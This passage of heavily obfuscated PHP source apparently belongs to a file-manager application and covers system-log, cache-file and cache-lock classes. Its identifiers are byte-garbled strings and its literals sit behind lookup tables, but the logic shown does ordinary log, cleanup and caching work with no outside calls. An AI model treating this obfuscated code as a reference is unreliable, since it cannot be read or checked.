show_json($•æ˜Ø‰, !1, 100111); } if ($Õ‚ò’îÃ == $ÎŠ²ñ·À[627]) { return !0; } if ($éöÉ©… || $éâ˜Š ¬) { $ö–ì¦×Ä = array_merge($éöÉ©…, $éâ˜Š ¬); $ö–ì¦×Ä = array_filter(array_unique($ö–ì¦×Ä)); $this->removeByFileID($ö–ì¦×Ä); } if ($Æ Æ‡…æ) { $Æ Æ‡…æ = array_filter(array_unique($Æ Æ‡…æ)); foreach ($Æ Æ‡…æ as $µú”÷ùœ) { $‰˜çÔú° = IO::has($µú”÷ùœ, !0); if (!$‰˜çÔú°[$ÎŠ²ñ·À[242]] && !$‰˜çÔú°[$ÎŠ²ñ·À[243]]) { IO::remove($µú”÷ùœ); } } } return $this->remove($íãÜˆ›); } private function removeByFileID($†•¤¸› = array()) { $œôğ¢§® =& $_SERVER[¯‘·½]; if (empty($†•¤¸›)) { return; } $Íüß‡›Ş = array($œôğ¢§®[545] => array($œôğ¢§®[7], $†•¤¸›)); $¬ó¾Ó‹ô = Model($œôğ¢§®[1452])->where($Íüß‡›Ş)->field($œôğ¢§®[2325])->select(); if (!$¬ó¾Ó‹ô) { return Model($œôğ¢§®[548])->remove($†•¤¸›); } $¬ó¾Ó‹ô = array_to_keyvalue($¬ó¾Ó‹ô, $œôğ¢§®[194], $œôğ¢§®[545]); foreach ($¬ó¾Ó‹ô as $¸Ğ²‰à => $ÂÒ–Á…Ô) { Model($œôğ¢§®[916])->removeNow($¸Ğ²‰à, !1); } $ÕÙ°û†÷ = array_diff($†•¤¸›, array_unique(array_values($¬ó¾Ó‹ô))); if ($ÕÙ°û†÷) { return Model($œôğ¢§®[548])->remove($ÕÙ°û†÷); } } private function removeShareItems($¢Û¯‰ş¿) { $´—íğ«˜ =& $_SERVER[¯‘·½]; $ÁÆ¢æ–ë = "\x7b\151\157\x3a{$¢Û¯‰ş¿}\175\x2f"; $±ºø¡­ = array($´—íğ«˜[194] => 0, $´—íğ«˜[1281] => array($´—íğ«˜[461], "{$ÁÆ¢æ–ë}\45")); $Ñî¸õ•Û = Model($´—íğ«˜[1986])->where($±ºø¡­)->field($´—íğ«˜[672])->select(); if (empty($Ñî¸õ•Û)) { return; } $ÑÕÙ×Œ„ = array_to_keyvalue($Ñî¸õ•Û, $´—íğ«˜[12], $´—íğ«˜[672]); Model($´—íğ«˜[671])->remove($ÑÕÙ×Œ„); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\114\151\147\x68\164\x41\x70\160"; public $modelType = "\123\171\x73\164\x65\x6d\117\x70\164\151\157\156"; public $field = array("\156\141\155\x65", "\147\162\157\x75\160", "\x64\x65\163\x63", "\x63\157\x6e\164\145\156\x74"); public function listData($İôÄ¹î = false, $•ûİ¼âª = "\155\157\144\151\x66\171\x54\x69\x6d\145", $¨­‰’™ = true) { return parent::listData($İôÄ¹î, $•ûİ¼âª, $¨­‰’™); } public function remove($øÀñş ) { $ÈÊ’¸ğé = $this->findByName($øÀñş ); if (!$ÈÊ’¸ğé) { return !1; } return parent::remove($ÈÊ’¸ğé[$_SERVER[¯‘·½][477]]); } public function add($…úıœØ…) { if ($this->findByName($…úıœØ…[$_SERVER[¯‘·½][32]])) { return !1; } return parent::insert($…úıœØ…); } public function update($•ª¿ù•Ì, $şÔ™ÜÕ°) { $ê¦øãæ’ =& $_SERVER[¯‘·½]; $Ê§ÕñòØ = $this->findByName($•ª¿ù•Ì); $¢ÌÊ” Ø = $this->findByName($şÔ™ÜÕ°[$ê¦øãæ’[32]]); if (!$Ê§ÕñòØ || $¢ÌÊ” Ø && $¢ÌÊ” Ø[$ê¦øãæ’[477]] != $Ê§ÕñòØ[$ê¦øãæ’[477]]) { return !1; } return parent::update($Ê§ÕñòØ[$ê¦øãæ’[477]], $şÔ™ÜÕ°); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $•ŠÖ›ığ =& $_SERVER[¯‘·½]; return array($•ŠÖ›ığ[2381] => LNG($•ŠÖ›ığ[2382]), $•ŠÖ›ığ[2383] => LNG($•ŠÖ›ığ[2384]), $•ŠÖ›ığ[1950] => LNG($•ŠÖ›ığ[2385]), $•ŠÖ›ığ[2386] => LNG($•ŠÖ›ığ[2387]), $•ŠÖ›ığ[2388] => LNG($•ŠÖ›ığ[2389]), $•ŠÖ›ığ[2390] => LNG($•ŠÖ›ığ[2391]), $•ŠÖ›ığ[2392] => LNG($•ŠÖ›ığ[2393]), $•ŠÖ›ığ[1979] => LNG($•ŠÖ›ığ[2393]), $•ŠÖ›ığ[1980] => LNG($•ŠÖ›ığ[2394]), $•ŠÖ›ığ[2395] => LNG($•ŠÖ›ığ[2396]), $•ŠÖ›ığ[2397] => LNG($•ŠÖ›ığ[2398]), $•ŠÖ›ığ[2399] => LNG($•ŠÖ›ığ[2400]), $•ŠÖ›ığ[2401] => LNG($•ŠÖ›ığ[2402]), $•ŠÖ›ığ[1977] => LNG($•ŠÖ›ığ[2403]), $•ŠÖ›ığ[2404] => LNG($•ŠÖ›ığ[2405]), $•ŠÖ›ığ[1984] => LNG($•ŠÖ›ığ[2406]), $•ŠÖ›ığ[2407] => LNG($•ŠÖ›ığ[2408]), $•ŠÖ›ığ[2409] => LNG($•ŠÖ›ığ[2410]), $•ŠÖ›ığ[2411] => LNG($•ŠÖ›ığ[2412]), $•ŠÖ›ığ[2413] => LNG($•ŠÖ›ığ[2414]), $•ŠÖ›ığ[1987] => LNG($•ŠÖ›ığ[2415]), $•ŠÖ›ığ[1988] => LNG($•ŠÖ›ığ[2416]), $•ŠÖ›ığ[2417] => LNG($•ŠÖ›ığ[2418]), $•ŠÖ›ığ[2419] => LNG($•ŠÖ›ığ[2420]), $•ŠÖ›ığ[2421] => LNG($•ŠÖ›ığ[2422]), $•ŠÖ›ığ[1982] => LNG($•ŠÖ›ığ[2423]), $•ŠÖ›ığ[2424] => LNG($•ŠÖ›ığ[2425]), $•ŠÖ›ığ[1981] => LNG($•ŠÖ›ığ[2426]), $•ŠÖ›ığ[2427] => LNG($•ŠÖ›ığ[2427]), $•ŠÖ›ığ[2428] => LNG($•ŠÖ›ığ[2429]), $•ŠÖ›ığ[2430] => LNG($•ŠÖ›ığ[2427]), $•ŠÖ›ığ[2431] => LNG($•ŠÖ›ığ[2432]), $•ŠÖ›ığ[2433] => LNG($•ŠÖ›ığ[2434]), $•ŠÖ›ığ[2435] => LNG($•ŠÖ›ığ[2434]), $•ŠÖ›ığ[2436] => LNG($•ŠÖ›ığ[2437]), $•ŠÖ›ığ[2438] => LNG($•ŠÖ›ığ[2438]), $•ŠÖ›ığ[2439] => LNG($•ŠÖ›ığ[1954]), $•ŠÖ›ığ[2440] => LNG($•ŠÖ›ığ[2441]), $•ŠÖ›ığ[2442] => LNG($•ŠÖ›ığ[2443]), $•ŠÖ›ığ[2444] => LNG($•ŠÖ›ığ[2445]), $•ŠÖ›ığ[2446] => LNG($•ŠÖ›ığ[2447]), $•ŠÖ›ığ[2448] => LNG($•ŠÖ›ığ[2449]), $•ŠÖ›ığ[2450] => LNG($•ŠÖ›ığ[2450]), $•ŠÖ›ığ[2451] => LNG($•ŠÖ›ığ[2452]), $•ŠÖ›ığ[2453] => LNG($•ŠÖ›ığ[2454]), $•ŠÖ›ığ[2455] => LNG($•ŠÖ›ığ[2456]), $•ŠÖ›ığ[2457] => LNG($•ŠÖ›ığ[2458]), $•ŠÖ›ığ[2459] => LNG($•ŠÖ›ığ[2460]), $•ŠÖ›ığ[2461] => LNG($•ŠÖ›ığ[2462]), $•ŠÖ›ığ[213] => LNG($•ŠÖ›ığ[213]), $•ŠÖ›ığ[214] => LNG($•ŠÖ›ığ[2463]), $•ŠÖ›ığ[2464] => LNG($•ŠÖ›ığ[2464])); } private function typeFile() { $äáë¾ù =& $_SERVER[¯‘·½]; $Šç‡’Ö = array($äáë¾ù[1984] => array($äáë¾ù[1985]), $äáë¾ù[2399] => array($äáë¾ù[2465]), $äáë¾ù[2401] => array($äáë¾ù[2466]), $äáë¾ù[1977] => array($äáë¾ù[1978], $äáë¾ù[2467]), $äáë¾ù[2409] => array(), $äáë¾ù[2411] => array(), $äáë¾ù[2413] => array(), $äáë¾ù[1987] => array($äáë¾ù[1989]), $äáë¾ù[1988] => array($äáë¾ù[1989]), $äáë¾ù[2417] => array($äáë¾ù[2468]), $äáë¾ù[2419] => array($äáë¾ù[2468]), $äáë¾ù[2421] => array($äáë¾ù[2469]), $äáë¾ù[2407] => array($äáë¾ù[2470]), $äáë¾ù[1982] => array($äáë¾ù[2471]), $äáë¾ù[2424] => array($äáë¾ù[2472]), $äáë¾ù[1981] => array($äáë¾ù[1983])); return $Šç‡’Ö; } private function typeAll() { $§ªìîşÁ =& $_SERVER[¯‘·½]; $æ”ü = $this->typeList; $‡Şë…Ï¥ = array_filter($this->typeFile()); foreach ($‡Şë…Ï¥ as $ÑĞØäª… => $ƒÄ»ˆÂı) { $æ”ü[$ƒÄ»ˆÂı[0]] = $æ”ü[$ÑĞØäª…]; } $æ”ü[$§ªìîşÁ[1989]] = LNG($§ªìîşÁ[2473]); $æ”ü[$§ªìîşÁ[2468]] = LNG($§ªìîşÁ[2474]); return $æ”ü; } public function addLog($†ªûã», $õıÈØ¶  = array()) { $—ÖÉÑ¬¯ =& $_SERVER[¯‘·½]; if (!isset($this->typeList[$†ªûã»])) { return; } $ÂÓİĞà = Session::get($—ÖÉÑ¬¯[2147]); if (!$ÂÓİĞà) { $ÂÓİĞà = _get($õıÈØ¶ , $—ÖÉÑ¬¯[1806], 0); } if ($†ªûã» == $—ÖÉÑ¬¯[2440] && is_array($õıÈØ¶ [$—ÖÉÑ¬¯[2475]]) && !$õıÈØ¶ [$—ÖÉÑ¬¯[2475]]) { return; } $¯°§•ëá = get_client_ip(); if (!$õıÈØ¶  || strlen(json_encode($õıÈØ¶ )) >= 1024 * 64) { if ($õıÈØ¶  && is_array($õıÈØ¶ )) { $õıÈØ¶  = array_intersect_key($õıÈØ¶ , array_flip($—ÖÉÑ¬¯[477], $—ÖÉÑ¬¯[32])); $õıÈØ¶ [$—ÖÉÑ¬¯[2476]] = $¯°§•ëá; } else { $õıÈØ¶  = array($—ÖÉÑ¬¯[2476] => $¯°§•ëá); } } else { if (is_array($õıÈØ¶ )) { $õıÈØ¶ [$—ÖÉÑ¬¯[2476]] = $¯°§•ëá; } else { $õıÈØ¶  = array($—ÖÉÑ¬¯[1311] => $õıÈØ¶ , $—ÖÉÑ¬¯[2476] => $¯°§•ëá); } } $õıÈØ¶ [$—ÖÉÑ¬¯[2477]] = ACTION; $õıÈØ¶  = array($—ÖÉÑ¬¯[1796] => Session::sign(), $—ÖÉÑ¬¯[1797] => intval($ÂÓİĞà), $—ÖÉÑ¬¯[33] => $†ªûã», $—ÖÉÑ¬¯[1799] => json_encode($õıÈØ¶ )); return parent::add($õıÈØ¶ ); } public function remove($»×Ÿæ“) { $this->where(array($_SERVER[¯‘·½][495] => $»×Ÿæ“))->delete(); } private function _makeOrder($êÎÙ²‹— = '') { $·ñ ëÍò =& $_SERVER[¯‘·½]; $á—ÎŞó³ = $·ñ ëÍò[234]; $Ï¼²ÇŞÇ = array($·ñ ëÍò[525] => $·ñ ëÍò[526], $·ñ ëÍò[527] => $·ñ ëÍò[528]); $µ¾È•Ü¸ = Input::get($·ñ ëÍò[533], $·ñ ëÍò[7], $·ñ ëÍò[2190], array($·ñ ëÍò[2102], $·ñ ëÍò[527])); $µ¾È•Ü¸ = $Ï¼²ÇŞÇ[$µ¾È•Ü¸]; $êÎÙ²‹— = $êÎÙ²‹— . "{$á—ÎŞó³}\40{$µ¾È•Ü¸}"; return $this->order($êÎÙ²‹—); } public function get($€¢øª‹¤ = '') { $£ô…Àæ =& $_SERVER[¯‘·½]; if (!$€¢øª‹¤) { show_json(array()); } $ßµ‘Ÿ¹” = array(); if ($€¢øª‹¤[$£ô…Àæ[1806]]) { $ßµ‘Ÿ¹”[$£ô…Àæ[1806]] = $€¢øª‹¤[$£ô…Àæ[1806]]; } if (isset($€¢øª‹¤[$£ô…Àæ[846]])) { $×éôŠØ‘ = $€¢øª‹¤[$£ô…Àæ[846]]; $é¦¡Õºà = isset($€¢øª‹¤[$£ô…Àæ[847]]) ? $€¢øª‹¤[$£ô…Àæ[847]] : time(); $ßµ‘Ÿ¹”[$£ô…Àæ[234]] = array($£ô…Àæ[410], array($×éôŠØ‘, $é¦¡Õºà)); } if ($€¢øª‹¤[$£ô…Àæ[33]]) { $èÓœ§µ÷ = explode($£ô…Àæ[50], $€¢øª‹¤[$£ô…Àæ[33]]); $¢Å™£€µ = $this->typeFile(); $ôì¹ÖÍ‹ = array(); foreach ($èÓœ§µ÷ as $“²ü»³…) { $ôì¹ÖÍ‹[] = $“²ü»³…; if (isset($¢Å™£€µ[$“²ü»³…])) { $ôì¹ÖÍ‹ = array_merge($ôì¹ÖÍ‹, $¢Å™£€µ[$“²ü»³…]); } } $ôì¹ÖÍ‹ = array_unique($ôì¹ÖÍ‹); if ($ôì¹ÖÍ‹) { $ßµ‘Ÿ¹”[$£ô…Àæ[33]] = array($£ô…Àæ[7], $ôì¹ÖÍ‹); } } else { $ßµ‘Ÿ¹”[$£ô…Àæ[33]] = array($£ô…Àæ[2478], $£ô…Àæ[2479]); } if (!empty($€¢øª‹¤[$£ô…Àæ[2476]])) { $ßµ‘Ÿ¹”[$£ô…Àæ[528]] = array($£ô…Àæ[461], "\45{$€¢øª‹¤[$£ô…Àæ[2476]]}\x25"); } $õ§…‡– = $this->_makeOrder()->where($ßµ‘Ÿ¹”)->selectPage(); if (empty($õ§…‡–[$£ô…Àæ[447]])) { show_json(array(), !0, $õ§…‡–[$£ô…Àæ[444]]); } $õ§…‡–[$£ô…Àæ[447]] = $this->logList($õ§…‡–[$£ô…Àæ[447]]); return $õ§…‡–; } private function ipAddress(&$ÎÓ—•ßÚ) { $ —°€†„ =& $_SERVER[¯‘·½]; if (!empty($ÎÓ—•ßÚ[$ —°€†„[2476]])) { $÷¿óÃ•‡ = IpLocation::get($ÎÓ—•ßÚ[$ —°€†„[2476]]); } else { $÷¿óÃ•‡ = LNG($ —°€†„[2480]); } $ÎÓ—•ßÚ[$ —°€†„[2481]] = $÷¿óÃ•‡; } private function descZipDownload($™ î”ú, &$¯ş‚ˆ¾¹) { $»ÖúßØÆ =& $_SERVER[¯‘·½]; if (!isset($™ î”ú[$»ÖúßØÆ[2482]])) { return; } $Ëóœ‡†» = json_decode($™ î”ú[$»ÖúßØÆ[2482]], !0); foreach ($Ëóœ‡†» as $ç¦€ÛÅ) { try { $¨á¤ƒ = IO::infoFullSimple($ç¦€ÛÅ[$»ÖúßØÆ[87]]); } catch (Exception $Ì®ù¸–¯) { continue; } $™ î”ú[$»ÖúßØÆ[87]] = $ç¦€ÛÅ[$»ÖúßØÆ[87]]; $¯ş‚ˆ¾¹[] = $™ î”ú[$»ÖúßØÆ[194]] = $¨á¤ƒ[$»ÖúßØÆ[194]]; $¯ş‚ˆ¾¹[] = $™ î”ú[$»ÖúßØÆ[2244]] = $¨á¤ƒ[$»ÖúßØÆ[193]]; break; } return $™ î”ú; } private function getSourceList(&$Œ¾öş¹à) { $Âöê–Á =& $_SERVER[¯‘·½]; $ëŒŞ×¶ = array(); foreach ($Œ¾öş¹à as $—º’ò‰« => $°ËÉ®œ) { $âÖ†äË« = json_decode($°ËÉ®œ[$Âöê–Á[528]], !0); if ($°ËÉ®œ[$Âöê–Á[33]] == $Âöê–Á[1980]) { $âÖ†äË« = $this->descZipDownload($âÖ†äË«, $ëŒŞ×¶); $Œ¾öş¹à[$—º’ò‰«][$Âöê–Á[528]] = json_encode($âÖ†äË«); continue; } if (strpos($°ËÉ®œ[$Âöê–Á[33]], $Âöê–Á[2246]) !== 0) { if (!isset($âÖ†äË«[$Âöê–Á[87]]) || strpos($°ËÉ®œ[$Âöê–Á[33]], $Âöê–Á[2483]) !== 0) { continue; } try { $êıèà€‹ = IO::infoFullSimple($âÖ†äË«[$Âöê–Á[87]]); } catch (Exception $Õíè¸«) { continue; } $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[194]] = $êıèà€‹[$Âöê–Á[194]]; $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[2244]] = $êıèà€‹[$Âöê–Á[193]]; $Œ¾öş¹à[$—º’ò‰«][$Âöê–Á[528]] = json_encode($âÖ†äË«); continue; } $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[194]]; $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[2244]]; if ($âÖ†äË«[$Âöê–Á[33]] == $Âöê–Á[627]) { $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[528]][$Âöê–Á[1263]]; $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[528]][$Âöê–Á[1264]]; } if ($âÖ†äË«[$Âöê–Á[33]] == $Âöê–Á[2255]) { $ëŒŞ×¶[] = $âÖ†äË«[$Âöê–Á[528]][$Âöê–Á[194]]; } } if (!$ëŒŞ×¶) { return array(); } return Model($Âöê–Á[916])->sourceListInfo($ëŒŞ×¶, !0); } private function logList($½×ø€¦) { $…ëºÍÉî =& $_SERVER[¯‘·½]; $î‡Õğ£Ÿ = array_to_keyvalue($½×ø€¦, $…ëºÍÉî[12], $…ëºÍÉî[1806]); $Ø²Í”±Ê = Model($…ëºÍÉî[601])->userListInfo(array_unique($î‡Õğ£Ÿ)); $Öß¤Ä€û = $this->getSourceList($½×ø€¦); $ŞÇ¼¡…‚ = $this->typeAll(); $…¾Û­‘Í = array(); $¼¦Š¾è = array(); foreach ($½×ø€¦ as $ı¯í¬—¿ => $è‹ë†Ç) { $…‘ã…¤ß = $è‹ë†Ç[$…ëºÍÉî[33]]; $ˆîÇÄ³ = isset($Ø²Í”±Ê[$è‹ë†Ç[$…ëºÍÉî[1806]]]) ? $Ø²Í”±Ê[$è‹ë†Ç[$…ëºÍÉî[1806]]] : !1; $ä˜Ã¸‡Å = strpos($…‘ã…¤ß, $…ëºÍÉî[2484]) === 0 ? LNG($…ëºÍÉî[2485]) : LNG($…ëºÍÉî[2480]); $è‹ë†Ç[$…ëºÍÉî[32]] = isset($ˆîÇÄ³[$…ëºÍÉî[32]]) ? $ˆîÇÄ³[$…ëºÍÉî[32]] : LNG($…ëºÍÉî[2480]); $è‹ë†Ç[$…ëºÍÉî[2306]] = isset($ˆîÇÄ³[$…ëºÍÉî[2306]]) ? $ˆîÇÄ³[$…ëºÍÉî[2306]] : $…ëºÍÉî[12]; $è‹ë†Ç[$…ëºÍÉî[1693]] = isset($ŞÇ¼¡…‚[$…‘ã…¤ß]) ? $ŞÇ¼¡…‚[$…‘ã…¤ß] : $ä˜Ã¸‡Å; $è‹ë†Ç[$…ëºÍÉî[2189]] = $ˆîÇÄ³; $ÙÑ‚¿€Ø = json_decode($è‹ë†Ç[$…ëºÍÉî[528]], !0); $è‹ë†Ç[$…ëºÍÉî[2476]] = isset($ÙÑ‚¿€Ø[$…ëºÍÉî[2476]]) ? $ÙÑ‚¿€Ø[$…ëºÍÉî[2476]] : $…ëºÍÉî[12]; $è‹ë†Ç[$…ëºÍÉî[2481]] = IpLocation::get($è‹ë†Ç[$…ëºÍÉî[2476]]); if (strpos($…‘ã…¤ß, $…ëºÍÉî[2246]) === 0 || isset($ÙÑ‚¿€Ø[$…ëºÍÉî[2244]])) { $ÙÑ‚¿€Ø[$…ëºÍÉî[90]] = $Öß¤Ä€û[$ÙÑ‚¿€Ø[$…ëºÍÉî[194]]]; $ÙÑ‚¿€Ø[$…ëºÍÉî[2260]] = $Öß¤Ä€û[$ÙÑ‚¿€Ø[$…ëºÍÉî[2244]]]; if ($ÙÑ‚¿€Ø[$…ëºÍÉî[33]] == $…ëºÍÉî[627]) { $ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[1263]] = $Öß¤Ä€û[$ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[1263]]]; $ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[1264]] = $Öß¤Ä€û[$ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[1264]]]; } if ($ÙÑ‚¿€Ø[$…ëºÍÉî[33]] == $…ëºÍÉî[2255]) { $ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[194]] = $Öß¤Ä€û[$ÙÑ‚¿€Ø[$…ëºÍÉî[528]][$…ëºÍÉî[194]]]; } if ($ÙÑ‚¿€Ø[$…ëºÍÉî[33]] == $…ëºÍÉî[1251]) { $ÙÑ‚¿€Ø[$…ëºÍÉî[2260]] = $ÙÑ‚¿€Ø[$…ëºÍÉî[90]]; $ÙÑ‚¿€Ø[$…ëºÍÉî[2244]] = $ÙÑ‚¿€Ø[$…ëºÍÉî[2260]][$…ëºÍÉî[194]]; $ÙÑ‚¿€Ø[$…ëºÍÉî[90]] = !1; $ÙÑ‚¿€Ø[$…ëºÍÉî[194]] = $…ëºÍÉî[12]; } $ûÓ†½„ = array($…ëºÍÉî[1251], $…ëºÍÉî[2242]); if (!in_array($ÙÑ‚¿€Ø[$…ëºÍÉî[33]], $ûÓ†½„)) { if ($ÙÑ‚¿€Ø[$…ëºÍÉî[90]] && $ÙÑ‚¿€Ø[$…ëºÍÉî[90]][$…ëºÍÉî[191]] == $…ëºÍÉî[192]) { $¼¦Š¾è[] = $è‹ë†Ç[$…ëºÍÉî[477]]; unset($½×ø€¦[$ı¯í¬—¿]); continue; } if ($ÙÑ‚¿€Ø[$…ëºÍÉî[2260]] && $ÙÑ‚¿€Ø[$…ëºÍÉî[2260]][$…ëºÍÉî[191]] == $…ëºÍÉî[192]) { $¼¦Š¾è[] = $è‹ë†Ç[$…ëºÍÉî[477]]; unset($½×ø€¦[$ı¯í¬—¿]); continue; } } } $è‹ë†Ç[$…ëºÍÉî[528]] = $ÙÑ‚¿€Ø; unset($è‹ë†Ç[$…ëºÍÉî[2486]]); $…¾Û­‘Í[] = $è‹ë†Ç; } $this->clearSystemPathLog($¼¦Š¾è); return $…¾Û­‘Í; } private function clearSystemPathLog($…Î“×) { $¤çÌ“« =& $_SERVER[¯‘·½]; if (count($…Î“×) == 0) { return; } $®îá¨Åâ = array($¤çÌ“«[477] => array($¤çÌ“«[7], array_unique($…Î“×))); $this->where($®îá¨Åâ)->delete(); } public function deviceList($ô‹Ò×Ù‰, $ğÉİ„Ü  = 0) { $òœÈ€„ =& $_SERVER[¯‘·½]; $®ÒŞÈ³Í = array($òœÈ€„[1806] => $ô‹Ò×Ù‰, $òœÈ€„[234] => array($òœÈ€„[1110], $ğÉİ„Ü ), $òœÈ€„[33] => $òœÈ€„[1950]); $¯«¬Äµú = array(); $×š×‰Ä³ = $this->field($òœÈ€„[2487])->where($®ÒŞÈ³Í)->order($òœÈ€„[2258])->limit(50)->select(); foreach ($×š×‰Ä³ as $»‚ì×©å => $éÂÛÖá·) { if ($»‚ì×©å > 0 && abs($éÂÛÖá·[$òœÈ€„[234]] - $×š×‰Ä³[$»‚ì×©å - 1][$òœÈ€„[234]]) < 5) { continue; } $¥¤ÌÄß• = json_decode($éÂÛÖá·[$òœÈ€„[528]], !0); $éÂÛÖá·[$òœÈ€„[2476]] = isset($¥¤ÌÄß•[$òœÈ€„[2476]]) ? $¥¤ÌÄß•[$òœÈ€„[2476]] : $òœÈ€„[12]; unset($¥¤ÌÄß•[$òœÈ€„[2476]]); $ôÛ·Ğœ³ = $this->deviceType($¥¤ÌÄß•[$òœÈ€„[2247]]); if (isset($¯«¬Äµú[$ôÛ·Ğœ³])) { continue; } $éÂÛÖá·[$òœÈ€„[2481]] = IpLocation::get($éÂÛÖá·[$òœÈ€„[2476]]); $éÂÛÖá·[$òœÈ€„[528]] = $¥¤ÌÄß•; $¯«¬Äµú[$ôÛ·Ğœ³] = $éÂÛÖá·; } return array_values($¯«¬Äµú); } public function deviceType($ÇÏ¶œè) { return $ÇÏ¶œè; } } goto D–«®ÎìÑŞ; bÊÀŒ„Ó·â: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ğı•Ú¤, $Ğğê‘ñ˜) { $—ÄÂ´äø =& $_SERVER[¯‘·½]; $this->cachePath = $Ğı•Ú¤[$—ÄÂ´äø[87]]; $this->prefix = $—ÄÂ´äø[926]; $this->cacheTime = $Ğğê‘ñ˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Å”úáæÀ) { $•Ûµ­¶ =& $_SERVER[¯‘·½]; $Å”úáæÀ = str_replace(array($•Ûµ­¶[927], $•Ûµ­¶[100], $•Ûµ­¶[76]), $•Ûµ­¶[928], $Å”úáæÀ); return $this->cachePath . $•Ûµ­¶[929] . $Å”úáæÀ . $•Ûµ­¶[930]; } public function set($—º×ø¤„, $Ùîµé¿Ã, $áÊÃ’«— = false) { $áÊÃ’«— = $áÊÃ’«— ? $áÊÃ’«— : $this->cacheTime; $¯éıÎ® = $this->getFile($—º×ø¤„); if (file_put_contents($¯éıÎ®, $this->prefix . $Ùîµé¿Ã, LOCK_EX)) { @touch($¯éıÎ®, intval(time() + $áÊÃ’«—)); clearstatcache(); return !0; } @unlink($¯éıÎ®); return !1; } public function get($Â£Æ¯á) { $ü­ä„¾ = $this->getFile($Â£Æ¯á); if (file_exists($ü­ä„¾) && filemtime($ü­ä„¾) < time()) { @unlink($ü­ä„¾); return !1; } $ßÂ«ˆ•• = @file_get_contents($ü­ä„¾); return substr($ßÂ«ˆ••, strlen($this->prefix)); } public function remove($–„½Äú) { $—‹öäø = $this->getFile($–„½Äú); return @unlink($—‹öäø); } public function deleteAll() { $ËùÀ©…â =& $_SERVER[¯‘·½]; $Œ¢–˜° = scandir($this->cachePath); foreach ($Œ¢–˜° as $œø¨ºÏê) { $ÂÑÍ¬Ï¯ = $this->cachePath . $œø¨ºÏê; if (strpos($ÂÑÍ¬Ï¯, $ËùÀ©…â[930]) && strpos($ÂÑÍ¬Ï¯, $ËùÀ©…â[931])) { @unlink($ÂÑÍ¬Ï¯); } } } public function clearTimeout() { $Ÿ”ô¯Âø =& $_SERVER[¯‘·½]; $™í±’¬ = scandir($this->cachePath); foreach ($™í±’¬ as $â«ØŸ´±) { $Ö¤œæñÑ = $this->cachePath . $â«ØŸ´±; if (strpos($Ö¤œæñÑ, $Ÿ”ô¯Âø[930]) && strpos($Ö¤œæñÑ, $Ÿ”ô¯Âø[931]) && filemtime($Ö¤œæñÑ) < time()) { @unlink($Ö¤œæñÑ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $üĞˆ·›Á =& $_SERVER[¯‘·½]; if (self::$handle) { return self::$handle; } $´–Í«®° = $GLOBALS[$üĞˆ·›Á[6]][$üĞˆ·›Á[426]]; self::$timeout = $´–Í«®°[$üĞˆ·›Á[932]] ? $´–Í«®°[$üĞˆ·›Á[932]] : 10; $—Äå²ñ = _get($GLOBALS[$üĞˆ·›Á[6]], $üĞˆ·›Á[933]); $˜ôô¼‹ = $´–Í«®°[$üĞˆ·›Á[918]] ? $´–Í«®°[$üĞˆ·›Á[918]] : $üĞˆ·›Á[233]; if ($˜ôô¼‹ == $üĞˆ·›Á[21] && $—Äå²ñ == $üĞˆ·›Á[13]) { $˜ôô¼‹ = $üĞˆ·›Á[233]; } switch ($˜ôô¼‹) { case $üĞˆ·›Á[921]: self::$handle = new CacheLockRedis(); break; case $üĞˆ·›Á[922]: self::$handle = new CacheLockMemcached(); break; case $üĞˆ·›Á[21]: self::$handle = new CacheLockDatabase(); break; case $üĞˆ·›Á[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($üĞˆ·›Á[934], $üĞˆ·›Á[935]); } return self::$handle; } private static function key($‰éíò¤) { return $_SERVER[¯‘·½][936] . Cache::key($‰éíò¤); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($İø£Ğğ¾ = '') { self::$errorMsg = $İø£Ğğ¾; } public static function lockGlobal($ıÀšœØ, $úÉÕ®¸™) { return self::lock($ıÀšœØ, $úÉÕ®¸™, !0); } public static function lock($û¦ˆÄ¢, $…‹Îæ× = false, $·£¢“Ñ‘ = false) { $¨ƒŞ™Ä =& $_SERVER[¯‘·½]; $Ê¾ÎÀËé = self::init(); $²ê¡òŒ¦ = self::key($û¦ˆÄ¢); $…‹Îæ× = $…‹Îæ× ? $…‹Îæ× : self::$timeout; $ã“”€ÛŸ = timeFloat(); if (_get($GLOBALS, $¨ƒŞ™Ä[937], !1)) { if (!$Ê¾ÎÀËé->lock($²ê¡òŒ¦, 0.2)) { die; } return !0; } $“½ˆ««× = $Ê¾ÎÀËé->lock($²ê¡òŒ¦, $…‹Îæ×); $õµ›Ï¢Œ = timeFloat(); if (!$“½ˆ««×) { $»®©……Á = "\154\x6f\143\153\40\145\x72\162\157\162\73\x6b\x65\171\x3d{$û¦ˆÄ¢}\x3b\164\x69\x6d\x65\75{$…‹Îæ×}\x3b" . self::$errorMsg . $¨ƒŞ™Ä[74] . get_caller_msg(); $İÈâìÊŸ = LNG($¨ƒŞ™Ä[938]) . "\x28{$…‹Îæ×}\163\x29\x2e" . LNG($¨ƒŞ™Ä[939]); $İÈâìÊŸ .= $¨ƒŞ™Ä[940]; if 